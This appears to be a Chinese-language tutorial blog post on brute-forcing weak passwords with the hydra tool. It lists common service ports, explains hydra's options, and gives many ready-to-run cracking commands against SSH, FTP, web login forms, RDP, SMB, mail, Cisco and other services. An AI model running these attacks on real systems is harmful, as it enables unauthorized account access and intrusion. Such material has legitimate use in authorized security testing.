2018，网站的防护(sql,xss...)的安全保护也已经上升了一个等级，但是由于管理员的安全意识薄弱，网站弱口令漏洞依然猖獗，不信可以看补天的漏洞提交记录，弱口令依然是漏洞中的佼佼者，当然弱口令并不仅限于网站的后台登陆弱口令，还有端口，比如 Ftp:21，ssh:22，Telnet:23，Pop3:110，3389远程登陆，8080中间件Tomcat，7001中间件Weblogic，3306 Mysql数据库(phpmyadmin)，1433 SQLServer数据库，5432 Postgresql数据库...

端口扫描不用多讲，鄙人还是觉得nmap好一点，但是如何批量扫的话，丢包率可能高一点。

对于端口的爆破，首先要有一个好的字典，然后再有一个好的工具，工具的话，python脚本，超级弱口令检测工具....这里主要介绍kali里面hydra的爆破，应为hydra支持几乎所有协议的在线密码破解，并且容错率好，不过能不能爆破成功还是需要你有一个好的字典。

\---------------------------------------------------------------

**语法：**

```
# hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e ns][-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-f] [-s PORT] [-S] [-vV]
server service [OPT]
```

**参数详解：**



```
-R   根据上一次进度继续破解
-S   使用SSL协议连接
-s   指定端口
-l   指定用户名
-L   指定用户名字典(文件)
-p   指定密码破解
-P   指定密码字典(文件)
-e   空密码探测和指定用户密码探测(ns)
-M   <FILE>指定目标列表文件一行一条
-f   在使用-M参数以后，找到第一对登录名或者密码的时候中止破解。
-C   用户名可以用:分割(username:password)可以代替-l username -p password
-o   <FILE>输出文件
-t   指定多线程数量，默认为16个线程
-w   TIME 设置最大超时的时间，单位秒，默认是30s
-vV  显示详细过程
server     目标IP
service    指定服务名(telnet ftp pop3 mssql mysql ssh ssh2......)
```



#### 使用案例：

爆破 ssh:22 端口命令：

```
hydra -L users.txt -P password.txt -t 5 -vV -o ssh.txt -e ns 192.168.0.132 ssh
```

爆破 Ftp:21 端口命令(指定用户名为root)：

```
hydra -l root -P password.txt -t 5 -vV -o ftp.txt -e ns 192.168.0.132 ftp
```

get方式提交，破解web登录(指定用户名为admin)：

```
hydra -L user.txt -p password.txt -t 线程 -vV -e ns ip http-get /admin/
hydra -l admin -p password.txt -t 线程 -vV -e ns -f ip http-get /admin/index.php
```

post方式提交，破解web登录：

```
hydra -l admin -P password.txt -s 80 ip http-post-form "/admin/login.php:username=^USER^&password=^PASS^&submit=login:sorry password"
hydra -t 3 -l admin -P pass.txt -o out.txt -f 10.36.16.18 http-post-form "login.php:id=^USER^&passwd=^PASS^:<title>wrong username or password</title>"
```

参数说明：-t同时线程数3，-l用户名是admin，字典pass.txt，保存为out.txt，-f 当破解了一个密码就停止， 10.36.16.18目标ip，http-post-form表示破解是采用http的post方式提交的表单密码破解，<title>中的内容是表示错误猜解的返回信息提示。

破解https：

```
hydra -m /index.php -l admin -P password.txt 192.168.0.132 https
```

破解teamspeak：

```
hydra -l admin -P passworrd.txt -s 端口号 -vV 192.168.0.132 teamspeak
```

破解cisco：

```
hydra -P password.txt 192.168.0.132 cisco
hydra -m cloud -P password.txt 192.168.0.132 cisco-enable
```

破解smb：

```
hydra -l administrator -P password.txt 192.168.0.132 smb
```

破解pop3：

```
hydra -l root -P password.txt my.pop3.mail pop3
```

破解rdp(3389端口)：

```
hydra -l administrator -P password.txt -V 192.168.0.132 rdp
```

破解http-proxy：

```
hydra -l admin -P passwprd.txt http-proxy://192.168.0.132
```

破解imap：

```
hydra -L user.txt -p secret 192.168.0.132 imap PLAIN
hydra -C defaults.txt -6 imap://[fe80::2c:31ff:fe12:ac11]:143/PLAIN
```